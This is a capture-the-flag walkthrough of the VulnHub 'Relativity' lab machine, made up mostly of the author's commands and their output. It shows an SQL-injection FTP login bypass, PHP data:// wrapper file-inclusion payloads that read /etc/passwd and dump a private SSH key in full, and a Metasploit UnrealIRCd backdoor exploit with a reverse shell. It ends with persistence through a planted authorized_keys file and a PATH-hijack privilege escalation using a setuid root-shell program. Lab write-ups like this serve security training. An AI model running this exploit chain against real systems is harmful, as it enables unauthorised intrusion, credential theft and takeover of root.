@@ -1,0 +1,517 @@
+URL : https://www.vulnhub.com/entry/devrandom-relativity-v101,55/
+
+1.) Identify the IP address of the victim machine
+root@kali:~# netdiscover 
+ Currently scanning: 192.168.180.0/16   |   Screen View: Unique Hosts                                                                                                                                             
+
+ 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                                                  
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                   
+ ----------------------------------------------------------------------------- 
+ 192.168.174.1   00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                                                                                    
+ 192.168.174.2   00:50:56:e9:67:44    01    060   VMWare, Inc.                                                                                                                                                    
+ 192.168.174.139 00:0c:29:6a:3b:e0    01    060   VMware, Inc.                                                                                                                                                    
+ 192.168.174.254 00:50:56:f4:2f:9e    01    060   VMWare, Inc.                                                                                                                                                    
+
+root@kali:~# 
+
+
+2.) Run an nmap syn scan to identify open ports and running services	
+root@kali:~# nmap -p 1-65535 -sV -sS -A 192.168.174.139
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2016-02-01 15:36 EST
+Nmap scan report for 192.168.174.139
+Host is up (0.00096s latency).
+Not shown: 65532 filtered ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp
+|_ftp-bounce: no banner
+22/tcp open  ssh     OpenSSH 5.9 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 42:d0:50:45:6c:4f:6a:25:d9:5e:d4:7d:12:26:04:ef (DSA)
+|_  2048 1b:e9:72:2b:8a:0b:57:0a:4b:ad:3d:06:62:94:29:02 (RSA)
+80/tcp open  http    Apache httpd 2.2.23 ((Fedora))
+|_http-title: M.C. Escher - Relativity
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+SF-Port21-TCP:V=6.47%I=7%D=2/1%Time=56AFC238%P=i686-pc-linux-gnu%r(Generic
+SF:Lines,29,"220\x20Welcome\x20to\x20Relativity\x20FTP\x20\(mod_sql\)\r\n"
+SF:);
+MAC Address: 00:0C:29:6A:3B:E0 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10
+Network Distance: 1 hop
+Service Info: Host: Relativity
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.96 ms 192.168.174.139
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 141.51 seconds
+root@kali:~# 
+
+3.) Enumerating 21/tcp
+http://www.securityfocus.com/bid/33722/exploit
+root@kali:~# ftp 192.168.174.139
+Connected to 192.168.174.139.
+220 Welcome to Relativity FTP (mod_sql)
+Name (192.168.174.139:root): username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; -- -
+331 Password required for username:.
+Password:
+230 User username: %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; -- - logged in.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   3 root     root         4096 Mar  5  2013 0f756638e0737f4a0de1c53bf8937a08
+-rw-r--r--   1 root     root       235423 Mar  5  2013 artwork.jpg
+-rw-r--r--   1 root     root          130 Mar  5  2013 index.html
+226 Transfer complete.
+ftp> cd 0f756638e0737f4a0de1c53bf8937a08
+550 0f756638e0737f4a0de1c53bf8937a08: Permission denied
+ftp> 
+
+4.) Enumerating 80/tcp
+In Browser
+http://192.168.174.139/
+http://192.168.174.139/0f756638e0737f4a0de1c53bf8937a08/
+In Page Source:
+<li><a href="index.php?page=definition.php">Definition</a></li>
+<li><a href="index.php?page=escher.php">M.C. Escher</a></li>
+<li><a href="index.php?page=artwork.php">Artwork</a></li>
+http://192.168.174.139/0f756638e0737f4a0de1c53bf8937a08/index.php?page=definition.php
+Exploiting LFI - (Using php wrapper)
+http://192.168.174.139/0f756638e0737f4a0de1c53bf8937a08/index.php?page=data://text/plain, <?php system('cat /etc/passwd'); ?>
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+saslauth:x:999:999:"Saslauthd user":/run/saslauthd:/sbin/nologin
+avahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
+smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
+ftpu:x:1000:1000:proftpd user:/home/ftpu:/sbin/nologin
+apache:x:48:48:Apache:/var/www:/sbin/nologin
+mauk:x:1001:1001::/home/mauk:/bin/bash
+jetta:x:1002:1002::/home/jetta:/bin/bash
+2 users with /bin/bash shells -> mauk, jetta
+View files in /home/mauk
+http://192.168.174.139/0f756638e0737f4a0de1c53bf8937a08/index.php?page=data://text/plain,<?php system('ls -lah /home/mauk'); ?>
+total 28K
+drwxr-xr-x. 3 mauk mauk 4.0K Jul  9  2013 .
+drwxr-xr-x. 4 root root 4.0K Feb 25  2013 ..
+-rw-------. 1 mauk mauk   70 Jul  9  2013 .bash_history
+-rw-r--r--. 1 mauk mauk   18 Apr 23  2012 .bash_logout
+-rw-r--r--. 1 mauk mauk  193 Apr 23  2012 .bash_profile
+-rw-r--r--. 1 mauk mauk  124 Apr 23  2012 .bashrc
+drwxr-xr-x. 2 mauk mauk 4.0K Jul  9  2013 .ssh
+http://192.168.174.139/0f756638e0737f4a0de1c53bf8937a08/index.php?page=data://text/plain,<?php system('ls -lah /home/mauk/.ssh'); ?>
+total 20K
+drwxr-xr-x. 2 mauk mauk 4.0K Jul  9  2013 .
+drwxr-xr-x. 3 mauk mauk 4.0K Jul  9  2013 ..
+-rw-r--r--. 1 mauk mauk  397 Feb 24  2013 authorized_keys
+-rw-r--r--. 1 mauk mauk 1.7K Feb 24  2013 id_rsa
+-rw-r--r--. 1 mauk mauk  397 Feb 24  2013 id_rsa.pub
+http://192.168.174.139/0f756638e0737f4a0de1c53bf8937a08/index.php?page=data://text/plain,<?php system('cat /home/mauk/.ssh/id_rsa'); ?>
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA5sm/rHHoCaTtncp7DCSIJlWnUg9eyfpJ3czIn18U1lv5ZQf0
+9yGaDxafualdpXCNMo32mVQb9XQ7c2N7sdSdAjsgSjV0YG/IZGZNRyFS58YJQRdZ
+5wRu6eKAlQVss/Lq3zwuBsT8Om/1/cKpVgB3ukPtKA97M5iSxL1VWWXg6GVoJ6f6
+zIio/DZMFCxOU9Wyl7i8ssEoBxQlmgZh9pnYYhwo7Rf3RXBJeHDpuc1g+vol2vRN
+ALXqIBlItS08MhoTaS0SK+pD98OU34M745U5Mo4TgFjYc+eD7xewyduWuS5IuFPd
+xfcHkt0cQ7he0AYHuk5ooCI4ca3B0xcSZILWqwIDAQABAoIBAHNnIMxXLQNdkGAd
+tsfMoLQikodrHif7WuJpG0zuG5pQ5XWKtAi7qbCvzHDnaudmT4SfDld/gneLhord
+jSXQPi62aCATeL0cSGVD7pKJ7E3vbgM5bQAi7F9RnqBl1QRqjN3R1uYVrFaAU85v
+f4N8umHOw5ELpLyZJ5LvZfVNB1jNIRpxINhAP+/kVslsZ93qyssljokKFMy/uOIH
+r+SV3b3Zfogvg67AJ/g08jtCjYdbr7egPP2TYPMRz5fbTWCrc5m4EBvf5h5pP/w6
+Go12YacY2lbF5wzbFUjIdNyF7RZHFDbSB0bM9aCDmXTfywlFswYdb7HyIZrstQ9W
+BzWhIYkCgYEA/tUe/rhUcEYEXkhddkXWARcX0t9YNb8apY7WyVibiSyzh33mscRG
+MLZoJJri5QMvNdYkNGr5zSGEo270Q2CzduKCbhVjXIybIbmggAc/80gZ5E8FDgJ7
+szUKJL37BxXbAAYFIZkzXvc76Ve+vZvLfKMTbQqXTgKkQpGyRHLVOz8CgYEA59ht
+YicNlz2yM26mpGqQNLGtEC1RmyZbPn03yJRTBJG5/sOlMw0RI+cMEiqyo7MKHmMZ
++Z7VKVtk8xEQbUy6EAeeSri/Fh1xiKRtlwwQSU1q2ooPOmdHyUp+rhseoPaDAJgy
+3KJYbkQMzHVt6KhsWVTEnrz0VtxiTzRu7p2Y5ZUCgYEAt5X2RG+rdU8b6oibvI9H
+Q3XNlf+NXvsUSV2EY33QX5yyodQUFNFf98wRbv2epHoM0u45GwJOgHe7RLq0gq3x
+3J4GdSQ3dv9c64j9lf6jFbNF4/MBozwqvcpiSmILrOkT4wpzO+dQ2QOoR80M/zB0
+ApDBd/b/VhYVHFg2Y5WPBKUCgYBn47SIMgXGCtBqeZ/UtyetZRyuzg/uXQ6v/r5b
+dBOLTZ2xyouhR66xjtv63AU2k4jqOvAtyf2szZZ70N6yi5ooirFkvEpsJ39zgnLV
+J4O4xScnjIvsWNFzIp2HeQGNkUj8oDbSZTEJIBc4GzrH8Yizsud0VimLLrAi29UF
+ubsEzQKBgQDpWaD5rTcaWueiH2DwI7kbdgyf6yfpunsRNsnq0GqZ2wSaUyKt9b1j
+bj9Dp+VxrUt584v//7z9Skkde2akJbA/qiF8/oOvzaiNRAOfpLCiqoL0vJ5dIvcg
+aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg==
+-----END RSA PRIVATE KEY-----
+
+5.) Enumerating 22/tcp
+root@kali:~/Desktop# chmod 400 mauk_id_rsa 
+root@kali:~/Desktop# ssh mauk@192.168.174.139 -i mauk_id_rsa 
+[mauk@Relativity ~]$ netstat -atnp
+(No info could be read for "-p": geteuid()=1001 but you should be root.)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:6667          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 192.168.174.139:22      192.168.174.137:40685   ESTABLISHED -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+[mauk@Relativity ~]$ ps -edf | grep irc
+jetta      551     1  0 21:03 ?        00:00:00 /opt/Unreal/src/ircd
+mauk       945   921  0 21:31 pts/0    00:00:00 grep --color=auto irc
+[mauk@Relativity ~]$ nmap
+-bash: nmap: command not found
+[mauk@Relativity ~]$ 
+
+Finding out the version of ircd
+Nmap is not install on the victim
+ssh tunneling has to be done to scan port 6667
+In mauk
+[mauk@Relativity ~]$ ssh -f root@192.168.174.137 -R 6667:127.0.0.1:6667 -N
+The authenticity of host '192.168.174.137 (192.168.174.137)' can't be established.
+RSA key fingerprint is 22:c3:dc:0b:27:42:23:fb:75:e2:ef:64:ea:96:d7:83.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.174.137' (RSA) to the list of known hosts.
+root@192.168.174.137's password: 
+[mauk@Relativity ~]$ 
+In Kali
+root@kali:~/Desktop# service ssh start
+[ ok ] Starting OpenBSD Secure Shell server: sshd.
+root@kali:~/Desktop# ifconfig 
+eth0      Link encap:Ethernet  HWaddr 00:0c:29:eb:8b:2a  
+          inet addr:192.168.174.137  Bcast:192.168.174.255  Mask:255.255.255.0
+          inet6 addr: fe80::20c:29ff:feeb:8b2a/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:2558 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:310574 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:1493711 (1.4 MiB)  TX bytes:17340340 (16.5 MiB)
+          Interrupt:19 Base address:0x2000 
+		  
+root@kali:~/Desktop# netstat -antp
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:6667          0.0.0.0:*               LISTEN      4415/sshd: root 
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      4394/sshd       
+tcp        0      0 192.168.174.137:22      192.168.174.139:53717   ESTABLISHED 4415/sshd: root 
+tcp        0      0 192.168.174.137:40685   192.168.174.139:22      ESTABLISHED 4283/ssh        
+tcp6       0      0 ::1:6667                :::*                    LISTEN      4415/sshd: root 
+tcp6       0      0 :::22                   :::*                    LISTEN      4394/sshd       
+root@kali:~/Desktop# nmap -A -p 6667 127.0.0.1
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2016-02-01 16:17 EST
+Nmap scan report for localhost (127.0.0.1)
+Host is up (440s latency).
+PORT     STATE SERVICE VERSION
+6667/tcp open  irc     Unreal ircd
+| irc-info: 
+|   server: relativity.localdomain
+|   version: Unreal3.2.8.1. relativity.localdomain 
+|   servers: 1
+|   users: 1
+|   lservers: 0
+|   lusers: 1
+|   uptime: 0 days, 0:45:02
+|   source host: rox-D2735CD4
+|_  source ident: nmap
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.7 - 3.15
+Network Distance: 0 hops
+Service Info: Host: relativity.localdomain
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 51.74 seconds
+root@kali:~/Desktop# 
+
+Exploiting ircd
+root@kali:~# msfconsole
+msf > search ircd
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                        Disclosure Date  Rank       Description
+   ----                                        ---------------  ----       -----------
+   exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  UnrealIRCD 3.2.8.1 Backdoor Command Execution
+
+
+msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf exploit(unreal_ircd_3281_backdoor) > show options 
+
+Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                   yes       The target address
+   RPORT  6667             yes       The target port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf exploit(unreal_ircd_3281_backdoor) > set RHOST localhost
+RHOST => localhost
+msf exploit(unreal_ircd_3281_backdoor) > show payloads 
+
+Compatible Payloads
+===================
+
+   Name                                Disclosure Date  Rank    Description
+   ----                                ---------------  ----    -----------
+   cmd/unix/bind_perl                                   normal  Unix Command Shell, Bind TCP (via Perl)
+   cmd/unix/bind_perl_ipv6                              normal  Unix Command Shell, Bind TCP (via perl) IPv6
+   cmd/unix/bind_ruby                                   normal  Unix Command Shell, Bind TCP (via Ruby)
+   cmd/unix/bind_ruby_ipv6                              normal  Unix Command Shell, Bind TCP (via Ruby) IPv6
+   cmd/unix/generic                                     normal  Unix Command, Generic Command Execution
+   cmd/unix/reverse                                     normal  Unix Command Shell, Double Reverse TCP (telnet)
+   cmd/unix/reverse_perl                                normal  Unix Command Shell, Reverse TCP (via Perl)
+   cmd/unix/reverse_perl_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via perl)
+   cmd/unix/reverse_ruby                                normal  Unix Command Shell, Reverse TCP (via Ruby)
+   cmd/unix/reverse_ruby_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via Ruby)
+   cmd/unix/reverse_ssl_double_telnet                   normal  Unix Command Shell, Double Reverse TCP SSL (telnet)
+
+msf exploit(unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse_perl
+payload => cmd/unix/reverse_perl
+msf exploit(unreal_ircd_3281_backdoor) > show options 
+
+Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST  localhost        yes       The target address
+   RPORT  6667             yes       The target port
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf exploit(unreal_ircd_3281_backdoor) > set LHOST 192.168.174.137
+LHOST => 192.168.174.137
+msf exploit(unreal_ircd_3281_backdoor) > set LPORT 80
+LPORT => 80
+msf exploit(unreal_ircd_3281_backdoor) > exploit 
+
+[*] Started reverse handler on 192.168.174.137:80 
+[*] Connected to localhost:6667...
+    :relativity.localdomain NOTICE AUTH :*** Looking up your hostname...
+    :relativity.localdomain NOTICE AUTH :*** Found your hostname (cached)
+[*] Sending backdoor command...
+[*] Command shell session 1 opened (192.168.174.137:80 -> 192.168.174.139:56232) at 2016-02-01 16:41:35 -0500
+
+id
+uid=1002(jetta) gid=1002(jetta) groups=1002(jetta)
+mkdir /home/jetta/.ssh
+cp /home/mauk/.ssh/authorized_keys /home/jetta/.ssh/authorized_keys
+ls -la /home/jetta/.ssh
+total 12
+drwx------  2 jetta jetta 4096 Feb  1 22:12 .
+drwx------. 4 jetta jetta 4096 Feb  1 22:12 ..
+-rw-------  1 jetta jetta  397 Feb  1 22:12 authorized_keys
+
+Login as jetta using SSH
+ root@kali:~/Desktop# ssh jetta@192.168.174.139 -i mauk_id_rsa 
+[jetta@Relativity ~]$ sudo -l
+Matching Defaults entries for jetta on this host:
+    requiretty, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
+    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY PATH", env_reset
+
+User jetta may run the following commands on this host:
+    (root) NOPASSWD: /home/jetta/auth_server/auth_server
+[jetta@Relativity ~]$ cd /home/jetta/auth_server/
+[jetta@Relativity auth_server]$ ls
+auth_server
+[jetta@Relativity auth_server]$ file auth_server 
+auth_server: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=0x93cf19e57baa43cf0162c34308bc11b8f361c00d, not stripped
+[jetta@Relativity auth_server]$ sudo ./auth_server 
+[+] Checking Certificates...done
+[+] Contacting server, please wait...could not establish connection
+error: (12)
+ ________________________________ 
+/ Your packets were eaten by the \
+\ terminator                     /
+ -------------------------------- 
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+[jetta@Relativity auth_server]$ strings ./auth_server 
+/lib64/ld-linux-x86-64.so.2
+__gmon_start__
+libc.so.6
+fflush
+puts
+putchar
+printf
+poll
+stdout
+system
+__libc_start_main
+GLIBC_2.2.5
+l$ L
+t$(L
+|$0H
+[+] Checking Certificates... 
+done
+[+] Contacting server, please wait... 
+could not establish connection
+invalid certificates
+error: (12)
+fortune -s | /usr/bin/cowsay
+Starting Auth server..
+;*3$"
+[jetta@Relativity auth_server]$ fortune -s | /usr/bin/cowsay
+ _____________________________ 
+< I'm shaving!! I'M SHAVING!! >
+ ----------------------------- 
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+[jetta@Relativity auth_server]$ 
+
+The binary calls the system() function with the argument -> fortune -s | /usr/bin/cowsay
+Tool is called without the full path location
+fortune is not called from its full relative path
+/usr/bin/cowsay is called with full relative path
+Exploit ->
+Create our own tool fortune and modify the PATH variable so that auth_server calls out tool "fortune"
+
+Privilage escalation binary in /tmp
+[jetta@Relativity auth_server]$ nano /tmp/rootshell.c
+[jetta@Relativity auth_server]$ cat /tmp/rootshell.c
+//rootshell.c
+#include <unistd.h>
+int main() {
+    setreuid(geteuid(),geteuid());
+    setregid(geteuid(),geteuid());
+    execv("/bin/bash",0);
+}
+[jetta@Relativity auth_server]$
+[jetta@Relativity tmp]$ gcc rootshell.c -o rootshell
+[jetta@Relativity tmp]$ ls -lah /tmp/
+total 88K
+drwxrwxrwt. 15 root  root   16K Feb  1 22:30 .
+dr-xr-xr-x. 18 root  root  4.0K Feb 28  2013 ..
+drwxrwxrwt   2 root  root  4.0K Jul  9  2013 .font-unix
+drwxrwxrwt   2 root  root  4.0K Jul  9  2013 .ICE-unix
+-rwxrwxr-x   1 jetta jetta 6.9K Feb  1 22:30 rootshell
+-rw-rw-r--   1 jetta jetta  145 Feb  1 22:24 rootshell.c
+drwx------   4 root  root  4.0K Feb  1 21:03 systemd-namespace-2T4t8H
+drwx------   4 root  mysql 4.0K Feb  1 21:03 systemd-namespace-7butKa
+drwx------   4 root  mysql 4.0K Feb  1 21:03 systemd-namespace-A88UK7
+drwx------   4 root  mysql 4.0K Feb  1 22:02 systemd-namespace-C1d7am
+drwx------   4 root  mysql 4.0K Feb  1 22:02 systemd-namespace-hh8hfM
+drwx------   4 root  root  4.0K Feb  1 22:02 systemd-namespace-k7BirP
+drwx------   4 root  mysql 4.0K Feb  1 22:02 systemd-namespace-KTZ5km
+drwx------   4 root  mysql 4.0K Feb  1 21:03 systemd-namespace-tuUvUI
+drwxrwxrwt   2 root  root  4.0K Jul  9  2013 .Test-unix
+drwxrwxrwt   2 root  root  4.0K Jul  9  2013 .X11-unix
+drwxrwxrwt   2 root  root  4.0K Jul  9  2013 .XIM-unix
+[jetta@Relativity tmp]$ 
+
+Our own fortune tool
+[jetta@Relativity auth_server]$ nano /tmp/fortune
+[jetta@Relativity auth_server]$ cat /tmp/fortune 
+#!/bin/sh
+chown root:root /tmp/rootshell
+chmod 777 /tmp/rootshell
+chmod +s /tmp/rootshell
+[jetta@Relativity auth_server]$
+[jetta@Relativity auth_server]$ ls -lah /tmp/
+total 80K
+drwxrwxrwt. 15 root  root   16K Feb  1 22:26 .
+dr-xr-xr-x. 18 root  root  4.0K Feb 28  2013 ..
+drwxrwxrwt   2 root  root  4.0K Jul  9  2013 .font-unix
+-rwxrwxr-x   1 jetta jetta   90 Feb  1 22:26 fortune
+drwxrwxrwt   2 root  root  4.0K Jul  9  2013 .ICE-unix
+-rw-rw-r--   1 jetta jetta  145 Feb  1 22:24 rootshell.c
+drwx------   4 root  root  4.0K Feb  1 21:03 systemd-namespace-2T4t8H
+drwx------   4 root  mysql 4.0K Feb  1 21:03 systemd-namespace-7butKa
+drwx------   4 root  mysql 4.0K Feb  1 21:03 systemd-namespace-A88UK7
+drwx------   4 root  mysql 4.0K Feb  1 22:02 systemd-namespace-C1d7am
+drwx------   4 root  mysql 4.0K Feb  1 22:02 systemd-namespace-hh8hfM
+drwx------   4 root  root  4.0K Feb  1 22:02 systemd-namespace-k7BirP
+drwx------   4 root  mysql 4.0K Feb  1 22:02 systemd-namespace-KTZ5km
+drwx------   4 root  mysql 4.0K Feb  1 21:03 systemd-namespace-tuUvUI
+drwxrwxrwt   2 root  root  4.0K Jul  9  2013 .Test-unix
+drwxrwxrwt   2 root  root  4.0K Jul  9  2013 .X11-unix
+drwxrwxrwt   2 root  root  4.0K Jul  9  2013 .XIM-unix
+[jetta@Relativity auth_server]$ 
+
+PATH manipulation attack and get the flag
+[jetta@Relativity tmp]$ cd ~
+[jetta@Relativity ~]$ export PATH=/tmp:$PATH
+[jetta@Relativity ~]$ sudo auth_server/auth_server
+[+] Checking Certificates...done
+[+] Contacting server, please wait...could not establish connection
+error: (12)
+ _ 
+<   >
+ - 
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+[jetta@Relativity ~]$ /tmp/rootshell 
+[root@Relativity ~]# ls
+auth_server
+[root@Relativity ~]# cd /root/
+[root@Relativity root]# ls -lah
+total 52K
+dr-xr-x---.  5 root root 4.0K Jul  9  2013 .
+dr-xr-xr-x. 18 root root 4.0K Feb 28  2013 ..
+-rw-------.  1 root root 1.8K Jul  9  2013 .bash_history
+-rw-r--r--.  1 root root   18 Jan 14  2012 .bash_logout
+-rw-r--r--.  1 root root  202 Feb 25  2013 .bash_profile
+-rw-r--r--.  1 root root  176 Feb 25  2013 .bashrc
+-rw-r--r--.  1 root root  100 Jan 14  2012 .cshrc
+-rw-------   1 root root   33 Mar  8  2013 flag.txt
+-rw-------   1 root root   46 Feb 28  2013 .lesshst
+drwxr-xr-x.  3 root root 4.0K Feb 17  2013 .local
+drwxr-----.  3 root root 4.0K Feb 17  2013 .pki
+drwxr-xr-x.  2 root root 4.0K Jul  9  2013 .ssh
+-rw-r--r--.  1 root root  129 Jan 14  2012 .tcshrc
+[root@Relativity root]# cat flag.txt 
+65afa0e5928b98f7ae283e16df2d43bf
+[root@Relativity root]# 
